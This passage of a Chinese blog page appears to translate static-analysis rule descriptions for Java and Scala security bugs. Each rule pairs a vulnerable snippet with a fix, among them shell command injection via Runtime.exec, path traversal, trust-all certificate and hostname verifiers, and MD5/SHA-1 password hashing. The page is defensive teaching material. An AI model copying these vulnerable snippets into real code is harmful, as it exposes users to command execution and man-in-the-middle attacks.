class="line">&#125;</span><br><span class="line">1234567891011121314</span><br></pre></td></tr></table></figure><p>引用：<br>[WASC: Path Traversal](<a href="http://projects.webappsec.org/w/page/13246952/Path" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246952/Path</a> Traversal)<br><a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank" rel="noopener">OWASP: Path Traversal</a><br><a href="http://capec.mitre.org/data/definitions/126.html" target="_blank" rel="noopener">CAPEC-126: Path Traversal</a><br><a href="http://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</a></p><h1 id="潜在的路径穿越（文件写）"><a href="#潜在的路径穿越（文件写）" class="headerlink" title="潜在的路径穿越（文件写）"></a>潜在的路径穿越（文件写）</h1><p>漏洞特征：PATH_TRAVERSAL_OUT<br>一个文件被打开，然后读取文件内容，这个文件名来自于一个输入的参数。如果没有过滤这个传入的参数，那么本地文件系统中任意文件都会被修改。<br>这个规则识别潜在的路径穿越漏洞。在许多场景中，用户无法控制文件路径，如果有工具报告了这个问题，那么这个就是误报<br>引用：<br>[WASC: Path Traversal](<a href="http://projects.webappsec.org/w/page/13246952/Path" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246952/Path</a> Traversal)<br><a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank" rel="noopener">OWASP: Path Traversal</a><br><a href="http://capec.mitre.org/data/definitions/126.html" target="_blank" rel="noopener">CAPEC-126: Path Traversal</a><br><a href="http://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</a></p><h1 id="潜在的路径穿越（文件读取）-1"><a href="#潜在的路径穿越（文件读取）-1" class="headerlink" title="潜在的路径穿越（文件读取）"></a>潜在的路径穿越（文件读取）</h1><p>漏洞特征：SCALA_PATH_TRAVERSAL_IN<br>一个文件被打开，然后读取文件内容，这个文件名来自于一个输入的参数。如果没有过滤这个传入的参数，那么本地文件系统中任意文件都会被读取。<br>这个规则识别潜在的路径穿越漏洞。在许多场景中，用户无法控制文件路径，如果有工具报告了这个问题，那么这个就是误报<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def getWordList(value:String) = Action &#123;</span><br><span class="line">  if (!Files.exists(Paths.get(&quot;public/lists/&quot; + value))) &#123;</span><br><span class="line">    NotFound(&quot;File not found&quot;)</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    val result = Source.fromFile(&quot;public/lists/&quot; + value).getLines().mkString // Weak point</span><br><span class="line">    Ok(result)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.io.FilenameUtils;</span><br><span class="line"></span><br><span class="line">def getWordList(value:String) = Action &#123;</span><br><span class="line">  val filename = &quot;public/lists/&quot; + FilenameUtils.getName(value)</span><br><span class="line"></span><br><span class="line">  if (!Files.exists(Paths.get(filename))) &#123;</span><br><span class="line">    NotFound(&quot;File not found&quot;)</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    val result = Source.fromFile(filename).getLines().mkString // Fix</span><br><span class="line">    Ok(result)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">123456789101112</span><br></pre></td></tr></table></figure><p>引用：<br>[WASC: Path Traversal](<a href="http://projects.webappsec.org/w/page/13246952/Path" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246952/Path</a> Traversal)<br><a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank" rel="noopener">OWASP: Path Traversal</a><br><a href="http://capec.mitre.org/data/definitions/126.html" target="_blank" rel="noopener">CAPEC-126: Path Traversal</a><br><a href="http://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</a></p><h1 id="潜在的命令注入"><a href="#潜在的命令注入" class="headerlink" title="潜在的命令注入"></a>潜在的命令注入</h1><p>漏洞特征：COMMAND_INJECTION<br>高亮部分的api被用来执行系统命令，如果输入这个api的数据没有被过滤，那么就会导致任意命令执行<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line"></span><br><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">r.exec(&quot;/bin/sh -c some_tool&quot; + input);</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://www.owasp.org/index.php/Command_Injection" target="_blank" rel="noopener">OWASP: Command Injection</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="http://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener">CWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</a></p><h1 id="潜在的命令注入-Scala"><a href="#潜在的命令注入-Scala" class="headerlink" title="潜在的命令注入(Scala)"></a>潜在的命令注入(Scala)</h1><p>漏洞特征：COMMAND_INJECTION<br>高亮部分的api被用来执行系统命令，如果输入这个api的数据没有被过滤，那么就会导致任意命令执行<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def executeCommand(value:String) = Action &#123;</span><br><span class="line">    val result = value.!</span><br><span class="line">    Ok(&quot;Result:\n&quot;+result)</span><br><span class="line">&#125;</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://www.owasp.org/index.php/Command_Injection" target="_blank" rel="noopener">OWASP: Command Injection</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="http://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener">CWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</a></p><h1 id="文件类函数没有过滤空字符"><a href="#文件类函数没有过滤空字符" class="headerlink" title="文件类函数没有过滤空字符"></a>文件类函数没有过滤空字符</h1><p>漏洞特征：WEAK_FILENAMEUTILS<br>一些文件类中方法没有过滤空字节（0x00）<br>如果空字节被注入到文件名之中，如果这个文件被放进系统之中，那么系统则只会读取空字符之前的文件名，字符串就会被空字符截断，甚至java本身也不能关注空字符或者处理这些特殊情况。操作系统的这一特性通常被用来绕过文件名验证去访问其他的文件（例如，后缀是.log”的文件）。</p><p>给出两点建议去修复这个问题：</p><ul><li>升级到7 update 40 或者最近的版本，或者java 8 +，因为空字节注入这个问题已经被这些版本的java所<a href="http://bugs.java.com/bugdatabase/view_bug.do?bug_id=8014846" target="_blank" rel="noopener">解决</a></li><li>要严格验证用户输入的文件名是否是有效的（例如不能包含空字符，不能包含路径字符）</li></ul><p>如果你知道你使用的现有的java版本可以避免空字符注入问题，你可以忽略上面的问题。</p><p>引用：<br>[WASC-28: Null Byte Injection](<a href="http://projects.webappsec.org/w/page/13246949/Null" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246949/Null</a> Byte Injection)<br><a href="http://cwe.mitre.org/data/definitions/158.html" target="_blank" rel="noopener">CWE-158: Improper Neutralization of Null Byte or NUL Character</a></p><h1 id="证书管理器接受任何证书"><a href="#证书管理器接受任何证书" class="headerlink" title="证书管理器接受任何证书"></a>证书管理器接受任何证书</h1><p>漏洞特征： WEAK_TRUST_MANAGER<br>空的证书管理器通常可以更轻松的连接到没有<a href="http://en.wikipedia.org/wiki/Certificate_authority" target="_blank" rel="noopener">根证书</a>的主机上。结果就是，就会更容易受到中间人攻击，因为客户端信任所有的证书。<br>一个证书管理器应该允许信任指定的一种证书（例如：基于信任库）。下面是一种可行的实现方法：<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class TrustAllManager implements X509TrustManager &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException &#123;</span><br><span class="line">        //Trust any client connecting (no certificate validation)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException &#123;</span><br><span class="line">        //Trust any remote server (no certificate validation)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">1234567891011121314151617</span><br></pre></td></tr></table></figure><p>解决方案(基于证书库的证书管理器）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">KeyStore ks = //Load keystore containing the certificates trusted</span><br><span class="line"></span><br><span class="line">SSLContext sc = SSLContext.getInstance(&quot;TLS&quot;);</span><br><span class="line"></span><br><span class="line">TrustManagerFactory tmf = TrustManagerFactory.getInstance(&quot;SunX509&quot;);</span><br><span class="line">tmf.init(ks);</span><br><span class="line"></span><br><span class="line">sc.init(kmf.getKeyManagers(), tmf.getTrustManagers(),null);</span><br><span class="line"></span><br><span class="line">123456789</span><br></pre></td></tr></table></figure><p>引用：<br>[WASC-04: Insufficient Transport Layer Protection](<a href="http://projects.webappsec.org/w/page/13246945/Insufficient" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246945/Insufficient</a> Transport Layer Protection)<br><a href="http://cwe.mitre.org/data/definitions/295.html" target="_blank" rel="noopener">CWE-295: Improper Certificate Validation</a></p><h1 id="HostnameVerifier-接收任何签名证书"><a href="#HostnameVerifier-接收任何签名证书" class="headerlink" title="HostnameVerifier 接收任何签名证书"></a>HostnameVerifier 接收任何签名证书</h1><p>漏洞规则：WEAK_HOSTNAME_VERIFIER<br>因为证书会被很多主机重复使用，接收任意证书的HostnameVerifier经常被使用。结果就是，就会更容易受到中间人攻击，因为客户端信任所有的证书。<br>一个证书管理器应该允许信任指定的一种证书（例如：基于信任库）。应该创建通配符证书，可以允许多个子域下证书。下面是一种可行的实现方法：<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class AllHosts implements HostnameVerifier &#123;</span><br><span class="line">    public boolean verify(final String hostname, final SSLSession session) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><p>解决方案(基于证书库的证书管理器）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">KeyStore ks = //Load keystore containing the certificates trusted</span><br><span class="line"></span><br><span class="line">SSLContext sc = SSLContext.getInstance(&quot;TLS&quot;);</span><br><span class="line"></span><br><span class="line">TrustManagerFactory tmf = TrustManagerFactory.getInstance(&quot;SunX509&quot;);</span><br><span class="line">tmf.init(ks);</span><br><span class="line"></span><br><span class="line">sc.init(kmf.getKeyManagers(), tmf.getTrustManagers(),null);</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure><p>引用：<br>[WASC-04: Insufficient Transport Layer Protection](<a href="http://projects.webappsec.org/w/page/13246945/Insufficient" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246945/Insufficient</a> Transport Layer Protection)<br><a href="http://cwe.mitre.org/data/definitions/295.html" target="_blank" rel="noopener">CWE-295: Improper Certificate Validation</a></p><h1 id="发现JAX-RS-REST服务器端"><a href="#发现JAX-RS-REST服务器端" class="headerlink" title="发现JAX-RS REST服务器端"></a>发现JAX-RS REST服务器端</h1><p>漏洞规则： JAXRS_ENDPOINT<br>这些函数是REST Web Service 的一部分(JSR311).<br>这个网站的安全性应该被分析。例如：</p><ul><li>权限认证，如果强制实施，就应该被测试</li><li>访问控制，如果强制实施，就应该被测试</li><li>输入应该被追踪，因为可能会有潜在的漏洞</li><li>聊天程序应该使用SSL</li><li>如果服务器支持存储私人数据（例如，通过POST），应该调查它是否对csrf有防御</li></ul><p>引用：<br><a href="https://www.owasp.org/index.php/REST_Assessment_Cheat_Sheet" target="_blank" rel="noopener">OWASP: REST Assessment Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/REST_Security_Cheat_Sheet" target="_blank" rel="noopener">OWASP: REST Security Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Web_Service_Security_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Web Service Security Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)" target="_blank" rel="noopener">OWASP: Cross-Site Request Forgery</a><br><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: CSRF Prevention Cheat Sheet</a><br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="发现Tapestry页面"><a href="#发现Tapestry页面" class="headerlink" title="发现Tapestry页面"></a>发现Tapestry页面</h1><p>漏洞规则： TAPESTRY_ENDPOINT<br>在应用启动的时候，Tapestry会被发现。Tapestry应用的每一个页面又后端java类和相关的Tapestry标记语言构成（a.tml 文件）。当请求到达的时候，GET/POST参数会被映射到后端的java类之中。映射可以使用fieldName完成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">    protected String input;</span><br><span class="line">[...]</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>或者显示注释的定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">    @org.apache.tapestry5.annotations.Parameter</span><br><span class="line">    protected String parameter1;</span><br><span class="line"></span><br><span class="line">    @org.apache.tapestry5.annotations.Component(id = &quot;password&quot;)</span><br><span class="line">    private PasswordField passwordField;</span><br><span class="line">[...]</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure><p>这个页面被映射到视图中[/resources/package/PageName].tml.</p><p>在应用中的每一个Tapestry页面应该被调查，确保所有的输入都能被自动的映射，并在这些参数被使用之前都是有效的。<br>引用：<br><a href="http://tapestry.apache.org/" target="_blank" rel="noopener">Apache Tapestry Home Page</a><br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="发现Wicket的web页面"><a href="#发现Wicket的web页面" class="headerlink" title="发现Wicket的web页面"></a>发现Wicket的web页面</h1><p>漏洞特征：WICKET_ENDPOINT<br>这个类代表一个Wicket web页面。输入的数据会被来自实例中的PageParameters读取，然后把它们送入后端处理程序。当前页面会被映射到视图之中[/package/WebPageName].html.<br>在应用中的每一个Wicket页面应该被调查，确保所有的输入都能被自动的映射，并在这些参数被使用之前都是有效的。<br>引用：<br><a href="https://wicket.apache.org/" target="_blank" rel="noopener">Apache Wicket Home Page</a><br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="MD2-MD4-和-MD5都是脆弱的哈希函数"><a href="#MD2-MD4-和-MD5都是脆弱的哈希函数" class="headerlink" title="MD2, MD4 和 MD5都是脆弱的哈希函数"></a>MD2, MD4 和 MD5都是脆弱的哈希函数</h1><p>漏洞特征：WEAK_MESSAGE_DIGEST_MD5<br>不建议使用MD2, MD4 和 MD5这个摘要算法。应该使用PBKDF2作为密码的摘要算法。<br>md5哈希算法的安全性被严重损害。现已存在一种碰撞攻击，这种攻击可以用奔腾2.6 GHz 4核处理器在几秒内碰撞出另一个哈希相同的字符串。进一步来说，还有选择前缀碰撞攻击（chosen-prefix collision attack ），这种攻击能在一个小时之内找到两个前缀相同的哈希，只要现有计算机的计算水平就可以达到。</p><p><strong>“SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, and SHA-512/256:</strong><br>所有散列计算程序都支持这些哈希函数的使用。<br>NISI:通信传输：[传输中建议使用的加密算法和密钥长度](<a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf）" target="_blank" rel="noopener">http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf）</a></p><p>PBKDF的主要思想是减缓字典生成的时间或者增加攻击者攻击每一个密码的时间。攻击者会有一个密码表去爆破PBKDF所使用的迭代计数器和salt。因为攻击者必须花费大量的计算时间去尝试破解每一个密码，所以攻击者很难用字典攻击和爆破攻击去获得成功。<br>NISI:<a href="http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf" target="_blank" rel="noopener">基于密码的密钥的加密建议</a></p><p>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MessageDigest md5Digest = MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class="line">    md5Digest.update(password.getBytes());</span><br><span class="line">    byte[] hashValue = md5Digest.digest();</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] getEncryptedPassword(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">    PKCS5S2ParametersGenerator gen = new PKCS5S2ParametersGenerator(new SHA256Digest());</span><br><span class="line">    gen.init(password.getBytes(&quot;UTF-8&quot;), salt.getBytes(), 4096);</span><br><span class="line">    return ((KeyParameter) gen.generateDerivedParameters(256)).getKey();</span><br><span class="line">&#125;</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><p>解决方案（java 8 和之后的版本）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] getEncryptedPassword(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">    KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 4096, 256 * 8);</span><br><span class="line">    SecretKeyFactory f = SecretKeyFactory.getInstance(&quot;PBKDF2WithHmacSHA256&quot;);</span><br><span class="line">    return f.generateSecret(spec).getEncoded();</span><br><span class="line">&#125;</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><p>引用：<br>[1] [On Collisions for MD5](<a href="http://www.win.tue.nl/hashclash/On" target="_blank" rel="noopener">http://www.win.tue.nl/hashclash/On</a> Collisions for MD5 - M.M.J. Stevens.pdf): Master Thesis by M.M.J. Stevens<br>[2] [Chosen-prefix collisions for MD5 and applications](<a href="http://homepages.cwi.nl/~stevens/papers/stJOC" target="_blank" rel="noopener">http://homepages.cwi.nl/~stevens/papers/stJOC</a> - Chosen-Prefix Collisions for MD5 and Applications.pdf): Paper written by Marc Stevens<br>Wikipedia: MD5<br><a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" target="_blank" rel="noopener">NIST: Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths</a><br><a href="http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf" target="_blank" rel="noopener">NIST: Recommendation for Password-Based Key Derivation</a><br><a href="https://stackoverflow.com/q/22580853/89769" target="_blank" rel="noopener">Stackoverflow: Reliable implementation of PBKDF2-HMAC-SHA256 for Java</a><br><a href="http://cwe.mitre.org/data/definitions/327.html" target="_blank" rel="noopener">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a></p><h1 id="SHA-1-是脆弱的哈希算法"><a href="#SHA-1-是脆弱的哈希算法" class="headerlink" title="SHA-1 是脆弱的哈希算法"></a>SHA-1 是脆弱的哈希算法</h1><p>漏洞特征： WEAK_MESSAGE_DIGEST_SHA1<br>不建议使用SHA-1算法去加密密码、做数字签名和其他用途。应该使用PBKDF2作为密码的摘要算法。</p><p><strong>“SHA-1用于生成电子签名：</strong><br>SHA-1可能仅仅用于NIST指导的特殊协议的电子签名的生成。但是在其他的应用中，SHA-1 不应该用于电子签名</p><p><strong>SHA-1用于电子签名的验证：</strong><br>对于电子签名的验证，SHA-1可以被用于传统应用<br><strong>“SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, and SHA-512/256:</strong><br>所有散列计算程序都支持这些哈希函数的使用。<br>NISI:通信传输：[传输中建议使用的加密算法和密钥长度](<a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf）" target="_blank" rel="noopener">http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf）</a></p><p>PBKDF的主要思想是减缓字典生成的时间或者增加攻击者攻击每一个密码的时间。攻击者会有一个密码表去爆破PBKDF所使用的迭代计数器和salt。因为攻击者必须花费大量的计算时间去尝试破解每一个密码，所以攻击者很难用字典攻击和爆破攻击去获得成功。<br>NISI:<a href="http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf" target="_blank" rel="noopener">基于密码的密钥的加密建议</a></p><p>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MessageDigest sha1Digest = MessageDigest.getInstance(&quot;SHA1&quot;);</span><br><span class="line">sha1Digest.update(password.getBytes());</span><br><span class="line">byte[] hashValue = sha1Digest.digest();</span><br><span class="line">123</span><br><span class="line">byte[] hashValue = DigestUtils.getSha1Digest().digest(password.getBytes());</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] getEncryptedPassword(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">    PKCS5S2ParametersGenerator gen = new PKCS5S2ParametersGenerator(new SHA256Digest());</span><br><span class="line">    gen.init(password.getBytes(&quot;UTF-8&quot;), salt.getBytes(), 4096);</span><br><span class="line">    return ((KeyParameter) gen.generateDerivedParameters(256)).getKey();</span><br><span class="line">&#125;</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><p>解决方案（java 8 及以后的版本）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] getEncryptedPassword(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">    KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 4096, 256 * 8);</span><br><span class="line">    SecretKeyFactory f = SecretKeyFactory.getInstance(&quot;PBKDF2WithHmacSHA256&quot;);</span><br><span class="line">    return f.generateSecret(spec).getEncoded();</span><br><span class="line">&#125;</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://community.qualys.com/blogs/securitylabs/2014/09/09/sha1-deprecation-what-you-need-to-know" target="_blank" rel="noopener">Qualys blog: SHA1 Deprecation: What You Need to Know</a><br><a href="https://googleonlinesecurity.blogspot.ca/2014/09/gradually-sunsetting-sha-1.html" target="_blank" rel="noopener">Google Online Security Blog: Gradually sunsetting SHA-1</a><br><a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" target="_blank" rel="noopener">NIST: Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths</a><br><a href="http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf" target="_blank" rel="noopener">NIST: Recommendation for Password-Based Key Derivation</a><br><a href="https://stackoverflow.com/q/22580853/89769" target="_blank" rel="noopener">Stackoverflow: Reliable implementation of PBKDF2-HMAC-SHA256 for Java</a><br><a href="http://cwe.mitre.org/data/definitions/327.html" target="_blank" rel="noopener">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a></p><h1 id="DefaultHttpClient的默认构造函数与TLS-1-2不兼容"><a href="#DefaultHttpClient的默认构造函数与TLS-1-2不兼容" class="headerlink" title="DefaultHttpClient的默认构造函数与TLS 1.2不兼容"></a>DefaultHttpClient的默认构造函数与TLS 1.2不兼容</h1><p>漏洞特征： DEFAULT_HTTP_CLIENT<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpClient client = new DefaultHttpClient();</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>解决方案：<br>用建议的构造函数去升级你的代码并且配置jvm中https.protocols选项，使其包含TLSv1.2:<br>使用SystemDefaultHttpClient 代替</p><ul><li>示例代码：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpClient client = new SystemDefaultHttpClient();</span><br><span class="line">1</span><br></pre></td></tr></table></figure><ul><li>基于SSLSocketFactory类创建一个HttpClient，通过 <a href="https://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/conn/ssl/SSLSocketFactory.html#getSystemSocketFactory()" target="_blank" rel="noopener">getSystemSocketFactory()</a> 获得一个SSLScoketFactory实例，用这个实例去初始化一个HttpClient</li><li>基于SSLConnectionSocketFactory类创建一个HttpClient，通过 <a href="https://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/conn/ssl/SSLSocketFactory.html#getSystemSocketFactory()" target="_blank" rel="noopener">getSystemSocketFactory()</a> 获得一个SSLScoketFactory实例，用这个实例去初始化一个HttpClient</li><li>使用HttpClientBuilder，在调用build()之前调用useSystemProperties()<br>示例代码：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpClient client = HttpClientBuilder.create().useSystemProperties().build();</span><br><span class="line">1</span><br></pre></td></tr></table></figure><ul><li>HttpClients,调用 createSystem()去创建一个实例</li></ul><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpClient client = HttpClients.createSystem();</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://blogs.oracle.com/java-platform-group/entry/diagnosing_tls_ssl_and_https" target="_blank" rel="noopener">Diagnosing TLS, SSL, and HTTPS</a></p><h1 id="脆弱的SSLContext"><a href="#脆弱的SSLContext" class="headerlink" title="脆弱的SSLContext"></a>脆弱的SSLContext</h1><p>漏洞特征： SSL_CONTEXT<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SSLContext.getInstance(&quot;SSL&quot;);</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>解决方案：<br>用下面的代码升级你的代码，并且配置jvm的https.protocols选项，使其包含TLSv1.2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 